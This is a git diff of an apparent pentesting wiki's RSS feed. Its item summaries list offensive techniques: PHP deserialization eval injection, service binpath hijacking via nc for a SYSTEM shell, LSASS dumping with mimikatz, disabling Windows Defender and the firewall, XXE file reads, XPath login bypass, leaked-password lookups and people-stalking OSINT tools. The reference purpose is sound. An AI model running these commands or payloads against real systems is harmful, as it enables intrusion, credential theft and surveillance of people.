-      <guid>/web-attacks/client-side-injections/misc_others/</guid>
+      <guid>/web-pentest/injections/client-side-injections/misc_others/</guid>
       <description>Cross Origin Resource Sharing (CORS) https://portswigger.net/web-security/cors # CORS is a feature allowing access to resources hosted on different domains # If badly configured, it can allow cross-domain attacks like CSRF# Corsy is an automated tool to discover potential CORS misconfiguration and issues https://github.com/s0md3v/Corsy # Usage $ python3 corsy.py -u https://haax.fr ＣＯＲＳＹ {v0.2-beta} [+] Misconfiguration found! [!] Title: Wildcard value [!] Description: This host allows requests made from any origin. However, browsers will block all requests to this host by default.</description>
     </item>
     
     <item>
       <title>Omnibus</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/omnibus/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/omnibus/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/omnibus/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/omnibus/</guid>
       <description>General Informations https://github.com/InQuest/omnibus # An Omnibus is defined as a volume containing several novels or other items previously published separately # and that is exactly what the InQuest Omnibus project intends to be for Open Source Intelligence collection, research, and artifact management. # By providing an easy to use interactive command line application, users are able to create sessions to investigate various artifacts such as # IP addresses, domain names, email addresses, usernames, file hashes, Bitcoin addresses, and more as we continue to expand.</description>
     </item>
     
     <item>
       <title>PHP Serialization</title>
-      <link>/web-attacks/php-vulnerabilities/serialization/</link>
+      <link>/web-pentest/php-vulnerabilities/serialization/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/php-vulnerabilities/serialization/</guid>
+      <guid>/web-pentest/php-vulnerabilities/serialization/</guid>
       <description>Resources https://www.owasp.org/index.php/PHP_Object_Injection 
 PHP Serialisation (PHP Slim __wakeup) # Context - \App\Controller\Confidential.php $systemCall = new SystemCall(&amp;#39;system(&amp;#34;ls&amp;#34;);&amp;#39;); if($rank === UserRankService::ADMIN_RANK){ $app-&amp;gt;render(&amp;#39;front/confidential.twig&amp;#39;, array(&amp;#39;admin&amp;#39; =&amp;gt; $rank, &amp;#39;systemCall&amp;#39; =&amp;gt; $systemCall)); }else { $app-&amp;gt;redirect(&amp;#39;/connexion&amp;#39;, &amp;#39;/connexion&amp;#39;, 301); }# Context - \Slim\Middleware\SessionCookie.php if ($value) { try { $_SESSION = unserialize($value); } catch (\Exception $e) { $this-&amp;gt;app-&amp;gt;getLog()-&amp;gt;error(&amp;#39;Error unserializing session cookie value! &amp;#39; . $e-&amp;gt;getMessage()); }# Context - \App\Service\SystemCall.php class SystemCall { public $hook; public $result; function __construct($hook) { $this-&amp;gt;hook = $hook; } function __wakeup() { $this-&amp;gt;result = eval($this-&amp;gt;hook); } function call() { $this-&amp;gt;__wakeup(); } }# You can override the __wakeup() method by crafting your own object and then inject it to execute command # The cookie value is unserialized and then evaluated # Base cookie a:2:{s:10:&amp;#34;slim.</description>
-    </item>
-    
-    <item>
-      <title>Password leaks</title>
-      <link>/open-source-intelligence-osint/human-recon/leaks/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/leaks/</guid>
-      <description>PwnedOrNot https://github.com/thewhiteh4t/pwnedOrNot.git # Simple python tool used to check haveIbeenpwned leaks for an e-mail or a list # The tool will then check if the dump is accessible (using haveibeenpwned/pastebin) to get passwords python pwnedornot.py -h python pwnedornot.py -e email@test.com python pwnedornot.py -f file.txt 
-Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search leaks and retrieve known passwords python pwndb.py --target email@test.fr python pwndb.py --list file python pwndb.py --target email@test.</description>
     </item>
     
     <item>
@@ -746,6 +839,15 @@ Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search lea
       
       <guid>/linux-systems/programing-languages/perl/</guid>
       <description># Perl command injection # open() function is vulnerable and can be used to execute commands # ex : “| shutdown -r |”</description>
+    </item>
+    
+    <item>
+      <title>Public Documents and Metadata</title>
+      <link>/open-source-intelligence-osint/company_investigations/documents_metadata/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/company_investigations/documents_metadata/</guid>
+      <description>Metagoofil # Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # The tool first perform a query in Google requesting different filetypes that can have useful metadata (pdf, doc, xls,ppt,etc) # Then will download those documents to the disk and extracts the metadata of the file using specific libraries for # parsing different file types (Hachoir, Pdfminer, etc) # Options # -d: domain to search # -t: filetype to download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx) # -l: limit of results to search (default 200) # -h: work with documents in directory (use \&amp;#34;yes\&amp;#34; for local analysis) # -n: limit of files to download # -o: working directory (location to save downloaded files) # -f: output file metagoofil.</description>
     </item>
     
     <item>
@@ -760,11 +862,60 @@ Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search lea
     </item>
     
     <item>
-      <title>VHOST Scanning</title>
-      <link>/recon-enumeration/application-scans/vhost/</link>
+      <title>Sensitive Endpoints</title>
+      <link>/web-pentest/resources-discovery/known_endpoints/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/application-scans/vhost/</guid>
+      <guid>/web-pentest/resources-discovery/known_endpoints/</guid>
+      <description>Apache Server Status # Apache server-status is an Apache monitoring instance # Available by default at http://example.com/server-status. # In normal cases, the server-status instance is not accessible by non-local IPs. # However, due to misconfiguration, it can be publicly accessible. # This leads anyone to view the great amount of data by server-status. # Data exposed : # - All URL requested by all hosts/vhosts, including obscure files/directories and session tokens # - All requested client&amp;#39;s IPs # Monitoring and exploiting Server Status https://github.</description>
+    </item>
+    
+    <item>
+      <title>Services &amp; Scheduled Tasks</title>
+      <link>/windows-systems/privilege-escalation/services_scheduled_tasks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/services_scheduled_tasks/</guid>
+      <description>Services # Query one service sc qc Spooler # Check permissions accesschk.exe -ucqv Spooler C:\&amp;gt; accesschk.exe -uwcqv &amp;#34;Authenticated Users&amp;#34; * RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS accesschk.exe -ucqv SSDPSRV accesschk.exe -ucqv upnphost # Search for specific service (looking for write permissions) sc qc upnphost # Following rights can give a SYSTEM shell SERVICE_CHANGE_CONFIG (Can reconfigure the service binary) WRITE_DAC (Can reconfigure permissions, leading to 1) WRITE_OWNER (Can become owner and reconfigure permissions) GENERIC_WRITE (Inherits SERVICE_CHANGE_CONFIG) GENERIC_ALL (Inherits SERVICE_CHANGE_CONFIG) # Exploit a vulnerable service (or adding new user) sc config upnphost binpath= &amp;#34;C:\nc.</description>
+    </item>
+    
+    <item>
+      <title>Subdomain Discovery</title>
+      <link>/open-source-intelligence-osint/technical-recon/subdomain_discovery/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/subdomain_discovery/</guid>
+      <description>Google Dorks &amp;amp; Bing Dorks # Google dorks are usefull for finding new subdomains site:wikipedia.org site:*.wikipedia.org -www -store -jobs -uk # Bing also support dorks and can give others results site: # When you use the Google Dork: site:*.example.com, NEVER forget to check site:*.*.example.com site:*.*.*.example.com # Github dorks also allow to find many subdomains &amp;#34;teslamotors.com&amp;#34; password # ... 
+Online DNS tools and services # VirusTotal runs its own passive DNS replication service # DNS Dumpster can also find large number of sub-domains</description>
+    </item>
+    
+    <item>
+      <title>Systems</title>
+      <link>/resources/systems/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/resources/systems/</guid>
+      <description>Windows Network / IPv6  MITM6 (https://github.com/fox-it/mitm6) NTLM Relaying and Kerberos Delegation (https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/) Compromising IPv4 networks via IPv6 (https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/) Domain Attacks Getting an Account (https://systemadminspro.com/domain-attacks-getting-an-account/) Peneration Testing Active Directory Part 1 (https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/) Taking Over IPv6 Networks (https://blog.vonahi.io/taking-over-ipv6-networks/) mitm6 pentesting (https://intrinium.com/mitm6-pen-testing/)  Kerberos  Kerberos Cheatsheet (https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)  Privilege Escalation  PrivExchange (https://github.com/dirkjanm/PrivExchange) Abusing Exchange (https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/) Exploiting PrivExchange (https://chryzsh.github.io/exploiting-privexchange/)
+ LOLBAS (https://lolbas-project.github.io/#)
+ Windows EoP Cheatsheet (https://guif.re/windowseop)
+ Windows Privilege Escalation (https://hackingandsecurity.</description>
+    </item>
+    
+    <item>
+      <title>Twitter</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/twitter/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/platforms-hunting/twitter/</guid>
+      <description>Tips &amp;amp; Tricks Geolocation # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweet geolocation https://onemilliontweetmap.com Downloader # Twitter video downloader https://twdown.net/ Account Analysis # Tweeter account analysis (account needed) https://tweetreach.com/ # When was created an account http://twbirthday.com/***REMOVED***/ # Sleeping time (account needed) http://sleepingtime.org/ # Simple analysis/analytics https://socialbearing.com/search/general/sodifrance https://foller.me # See all tweets from one account (account needed) https://www.allmytweets.net/connect/ Tracking Accounts &amp;amp; Modifications # With spoonbill, you can check and record people accounts modification # It checks accounts of people you&amp;#39;re following https://spoonbill.</description>
+    </item>
+    
+    <item>
+      <title>VHOST Scanning</title>
+      <link>/web-pentest/applicative-scans/vhost/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/applicative-scans/vhost/</guid>
       <description> Virtual Host Scanner # Basic HTTP Scanner that&amp;#39;ll enumerate virtual hosts on a given IP # It may reveal hidden hosts # Docker ? ruby scan.rb --ip=192.168.1.101 --host=domain.tld # Options --ignore-http-codes --ignore-content-length --port --- If running on another port --wordlist --- specify an alternative location for the wordlist file --ssl --- on/off depending if you want to connect to HTTP --output --- output file</description>
     </item>
     
@@ -779,12 +930,21 @@ Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search lea
     
     <item>
       <title>53 - DNS</title>
-      <link>/recon-enumeration/services-enumeration/53_dns/</link>
+      <link>/network/services-enumeration/53_dns/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/53_dns/</guid>
+      <guid>/network/services-enumeration/53_dns/</guid>
       <description>Zone Transfer # Port scan and trying zone transfer nmap --script=dns-transfer-zone -p 53 domain # DNS Zone Transfer using dig dig axfr @IP guess_domain_name 
 Active Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global Catalog dig -t SRV _gc._tcp.lab.ropnop.com # LDAP servers dig -t SRV _ldap._tcp.lab.ropnop.com # Kerberos KDC dig -t SRV _kerberos._tcp.lab.ropnop.com # Kerberos password change server dig -t SRV _kpasswd._tcp.lab.ropnop.com nmap --script dns-srv-enum --script-args “dns-srv-enum.</description>
+    </item>
+    
+    <item>
+      <title>Cryptocurrency Investigation</title>
+      <link>/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/misc/cryptocurrency_investigation/</guid>
+      <description>Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.py /path/to/file.json</description>
     </item>
     
     <item>
@@ -797,12 +957,13 @@ Active Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global
     </item>
     
     <item>
-      <title>Dorks</title>
-      <link>/open-source-intelligence-osint/technical-recon/dorks/</link>
+      <title>Facebook</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/facebook/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/dorks/</guid>
-      <description>Google Dorks # Google Hacking made easy https://pentest-tools.com/information-gathering/google-hacking# # Search for documents on popular clouds site:drive.google.com &amp;lt;searchterm&amp;gt; site:dl.dropbox.com &amp;lt;searchterm&amp;gt; site:s3.amazonaws.com &amp;lt;searchterm&amp;gt; site:onedrive.live.com &amp;lt;searchterm&amp;gt; site:cryptome.org &amp;lt;searchterm&amp;gt; # Admins credentials intext:company_keyword &amp;amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log &amp;amp; intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;administrator&amp;#34; &amp;amp; intext:&amp;#34;password&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;administrator&amp;#34; # Look for domains indexed by others website site:bgp.he.net inurl:ndd site:dnslookup.fr inurl:ndd # Get information on the internal organization sites:cadres.</description>
+      <guid>/open-source-intelligence-osint/platforms-hunting/facebook/</guid>
+      <description>Tips &amp;amp; Tricks # Stalking and Information Gathering https://stalkscan.com/ # Facebook video downloader https://fbdown.net/ # Find Facebook ID https://findmyfbid.com https://lookup-id.com/ # Facebook tool for multi searches https://whopostedwhat.com/ 
+Facebook Tricks # You can search by e-mail # You can find accounts by e-mail with the recover function https://www.facebook.com/login/identify?ctx=recover https://www.facebook.com/login/identify # Search photo by ID https://www.facebook.com/photo.php?fbid=PHOTO-ID-HERE # You can search for car using plate number # For example ST-597-NS will give you car photos identified with relating plate number</description>
     </item>
     
     <item>
@@ -816,6 +977,15 @@ ICMP Exfiltration 2 #!/usr/bin/env python from scapy.</description>
     </item>
     
     <item>
+      <title>IDOR</title>
+      <link>/web-pentest/resources-discovery/idor/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/resources-discovery/idor/</guid>
+      <description> IDOR (Insecure Direct Object Reference) # Bypass restrictions using parameter pollution # You can use the same parameter several times api.example/profile?UserId=123 # Ok, your profile api.example/profile?UserId=456 # ERROR api.example/profile?UserId=456&amp;amp;UserId=123 # OK, it can work# Tips # - Some encoded/hashed IDs can be predictable --&amp;gt; Create accounts to see # - Try some id, user_id, message_id even if the application seems to not offer it (on API for ex) # - Parameter Polluttion (HPP) # - Switch between POST and PUT to bypass potential controls # - </description>
+    </item>
+    
+    <item>
       <title>Impacket</title>
       <link>/windows-systems/exploitation/impacket/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -826,30 +996,31 @@ General # Almost every Impacket scripts follows the same option syntax authentic
     </item>
     
     <item>
-      <title>Instagram</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/instagram/</link>
+      <title>LSASS and Mimikatz</title>
+      <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/instagram/</guid>
-      <description>Tips &amp;amp; Tricks # Instagram User ID can be very important to investigate # Each account has a unique user ID linked to the @username # Some websites allows to get it for an account https://codeofaninja.com/tools/find-instagram-user-id # You can then trace and spot re-used instagram account by # searching for old names and post, for example using # Google Dorks # Instagram Mirrors can be usefull to browse Instagram accounts # Search features are less restrictive # Some deleted content can still be indexed https://rankersta.</description>
+      <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
+      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonPasswords /full # You can upload mimikatz to a remote machine with smbclient # Or you can use crackmapexec # Executon may fail but the binary will be uploaded in C:\\Windows\\mimikatz.</description>
     </item>
     
     <item>
       <title>Magento</title>
-      <link>/web-attacks/content-management-system-cms/magento/</link>
+      <link>/web-pentest/content-management-system-cms/magento/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/content-management-system-cms/magento/</guid>
+      <guid>/web-pentest/content-management-system-cms/magento/</guid>
       <description>Getting Magento Version # Magento has 2 mains branches, Magento 1 and Magento 2# On Magento 2, you can add /magento_version targetsite.com/magento_version# On magento 1, you have another login interface at /dowloader # Versions can be displayed in the footer https://www.example.com/downloader/ https://www.example.com/magento/downloader/# You can find the version by comparing hash file signatures # between several versions and the running one. # That&amp;#39;s what magescan does. https://github.com/steverobbins/magento-version-identification-php 
 Magescan # Online scanner # Usefull and complete, but online https://magescan.</description>
     </item>
     
     <item>
       <title>PHP Type Juggling</title>
-      <link>/web-attacks/php-vulnerabilities/type_juggling/</link>
+      <link>/web-pentest/php-vulnerabilities/type_juggling/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/php-vulnerabilities/type_juggling/</guid>
+      <guid>/web-pentest/php-vulnerabilities/type_juggling/</guid>
       <description>Type Juggling and Loose Comparison # Type Juggling # In PHP, “==” returns true if $a equals $b AFTER transtyping &amp;#34;0000&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;0e12&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;1abc&amp;#34; == int(1) -&amp;gt; TRUE &amp;#34;0abc&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;abc&amp;#34; == int(0) -&amp;gt; TRUE # Loose Comparison # In PHP, if “==” is used, then 2 strings beginning by “0e” and filled with numbers will always be equal # It means that you can use magic hashes (0exxxx.</description>
     </item>
     
@@ -876,17 +1047,6 @@ WinSCP # WinSCP is potentially exploitable in the registry if not using a master
     </item>
     
     <item>
-      <title>Searching Someone</title>
-      <link>/open-source-intelligence-osint/human-recon/searchingsomeone/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/searchingsomeone/</guid>
-      <description>https://github.com/lulz3xploit/LittleBrother
-Resources # GREAT resources containing different graphs and processes # to investigate based on what you have https://medium.com/@Peter_UXer/osint-how-to-find-information-on-anyone-5029a3c7fd56 https://medium.com/week-in-osint/getting-a-grasp-on-googleids-77a8ab707e43 https://www.aware-online.com/en 
-Searching People # Very good and accurate tool # You can search by name, reverse phone or reverse address https://www.truepeoplesearch.com/ # Good search engine, different kinds of data https://webmii.com/ # Kinda amazing resource # Finding company related data about a person https://aleph.occrp.org # Dead people registry (EU) https://deces.</description>
-    </item>
-    
-    <item>
       <title>Services</title>
       <link>/linux-systems/privilege-escalation/services/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -899,29 +1059,39 @@ MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;user
     
     <item>
       <title>Spiderfoot</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/spiderfoot/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/spiderfoot/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/spiderfoot/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/spiderfoot/</guid>
       <description>General Informations https://github.com/smicallef/spiderfoot https://www.spiderfoot.net/documentation/ # Query over 100 OSINT sources (IP, domain names, email, names and more) # Select the target, pick modules and spiderfoot will collect and build links # You can identify data leaks, vulnerabilities or sensitive information # Windows and Linux # Needed API Keys : Honeypot Checker, Shodan, VirusTotal, IBM X-Force Exchange # MalwarePatrol, BotScout, Cymon.io, Censys.io, Hunter.io, AlienVault OTX, ClearBit # BuiltWith, FraudGuard, IPinfo.io, CIRCL.</description>
     </item>
     
     <item>
-      <title>Web Application Firewall (WAF)</title>
-      <link>/recon-enumeration/application-scans/web_application_firewall/</link>
+      <title>Usernames</title>
+      <link>/open-source-intelligence-osint/human-recon/username/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/application-scans/web_application_firewall/</guid>
-      <description>General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another # simple algorithm to guess if a WAF or security solution is actively responding to our attacks .</description>
+      <guid>/open-source-intelligence-osint/human-recon/username/</guid>
+      <description># Username availability https://namechk.com/ 
+Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries.</description>
     </item>
     
     <item>
-      <title>Windows Defender</title>
-      <link>/windows-systems/privilege-escalation/windows_defender/</link>
+      <title>Web / Bug Bounty</title>
+      <link>/resources/web_bug_bounty/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
-      <description># Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
+      <guid>/resources/web_bug_bounty/</guid>
+      <description>APIs  API endpoints (https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d) API Security part 1 (https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93) 31 Tips for pentesting APIs (https://medium.com/bugbountywriteup/31-tips-api-security-pentesting-480b5998b765) 31 Tips (drive document) (https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0) IDOR/BOLA through API (https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2)  Server-Side Injections  SQL Injections filter bypass (https://websec.wordpress.com/tag/sql-filter-bypass/) SQL Injection Cheatsheet (https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) SSRF SVG Cheatsheet (https://github.com/allanlw/svg-cheatsheet)  Client-Side Injections  HTML5 Security Cheatsheet (https://html5sec.org/) XSS Payloads (https://gbhackers.com/top-500-important-xss-cheat-sheet/) Polyglot XSS (https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot) AwesomeXSS Payloads (https://github.com/s0md3v/AwesomeXSS/)  PHP  PHP Object Injections (https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) PHP Vulnerability Audit Cheatsheet (https://github.</description>
+    </item>
+    
+    <item>
+      <title>Web Application Firewall (WAF)</title>
+      <link>/web-pentest/applicative-scans/web_application_firewall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/applicative-scans/web_application_firewall/</guid>
+      <description>General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another # simple algorithm to guess if a WAF or security solution is actively responding to our attacks .</description>
     </item>
     
     <item>
@@ -936,10 +1106,10 @@ CeWL # CeWL allows you to build custom wordlists based on online resources # If 
     
     <item>
       <title>XML External Entity (XXE) and XSLT</title>
-      <link>/web-attacks/files-inclusions-and-injections/xxe/</link>
+      <link>/web-pentest/files-and-files-inclusions/xxe/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/files-inclusions-and-injections/xxe/</guid>
+      <guid>/web-pentest/files-and-files-inclusions/xxe/</guid>
       <description>Resources https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf 
 Basic XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/read=convert.base64-encode/resource=path/index.php&amp;#34; &amp;gt; ]&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt; ]&amp;gt;&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;# XXE via Word: &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % pe SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; %pe; ]&amp;gt; &amp;lt;foo&amp;gt;&amp;amp;external;&amp;lt;/foo&amp;gt; &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ELEMENT r ANY &amp;gt; &amp;lt;!ENTITY sp SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt; 
 Out of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # And then execute entities # SVG File &amp;lt;!</description>
@@ -947,20 +1117,30 @@ Out of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # A
     
     <item>
       <title>XPath Injections</title>
-      <link>/web-attacks/server-side-injections/xpath/</link>
+      <link>/web-pentest/injections/server-side-injections/xpath/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/server-side-injections/xpath/</guid>
+      <guid>/web-pentest/injections/server-side-injections/xpath/</guid>
       <description>Basic authentication bypass # XPath login/password often works as follow # $xpath = &amp;quot;//user[user=&#39;&amp;quot; . $_GET[&#39;user&#39;] . &amp;quot;&#39; and pass=&#39;&amp;quot; . $_GET[&#39;pass&#39;] . &amp;quot;&#39;]&amp;quot;; # You can make the 2 conds TRUE and log with the first user user=&#39; or &#39;1&#39;=&#39;1&amp;amp;pass=&#39; or &#39;1&#39;=&#39;1 # Log using a specific user //user[username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;truc&#39;] ⇒ John&#39; or &#39;1&#39;=&#39;1 # Bypass the password (because of the ‘=’) &#39; or username=&#39;John&#39; or &#39;&#39;=&#39;</description>
     </item>
     
     <item>
       <title>80/443 - HTTP/HTTPS</title>
-      <link>/recon-enumeration/services-enumeration/80_443_https/</link>
+      <link>/network/services-enumeration/80_443_https/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/80_443_https/</guid>
+      <guid>/network/services-enumeration/80_443_https/</guid>
       <description>Identification and Checks # IIS nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-iis-webdav-vuln &amp;lt;IP&amp;gt; # JBOSS (CVE-2010-0738) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2010-0738 &amp;lt;IP&amp;gt; # PHP-CGI (CVE-2012-1823) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2012-1823 &amp;lt;IP&amp;gt; # RCE Ruby on Rails (CVE-2013-0156) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2013-0156 &amp;lt;IP&amp;gt; # WAF Detection nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-waf-detect,http-waf-fingerprint &amp;lt;IP&amp;gt; # Check Heartbleed CVE-2014-0160 nmap -Pn -n -p 443 -v -T3 --script=ssl-heartbleed,ssl-enum-ciphers,ssl-known-key --script-args vulns.</description>
+    </item>
+    
+    <item>
+      <title>Admin and Processes</title>
+      <link>/windows-systems/privilege-escalation/admin_processes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
+      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results 
